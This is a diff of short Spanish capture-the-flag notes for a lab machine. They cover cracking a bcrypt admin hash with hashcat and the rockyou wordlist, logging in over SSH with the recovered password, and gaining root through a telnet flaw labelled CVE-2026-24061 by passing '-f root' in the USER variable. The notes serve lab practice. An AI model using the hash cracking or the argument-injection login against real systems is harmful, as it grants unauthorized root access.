@@ -21,4 +21,6 @@ CRAFT_DB_USER=root
 $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
 - Adam tiene la pw hasheada de admin (es admin) -> desencriptamos hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt (bcrypt)
 - darkangel ssh adam@10.129.104.22 -> leemos lfag user en directortio
-- 
+- sudo -l no esta permitido y en suid no veo nada raro.
+- netstat -tulnp y vemos que tiene abierto el puerto 23 telnet --version y vemos una version vulnerable a CVE-2026-24061
+- USER="-f root" telnet -a 127.0.0.1 y somos root :)
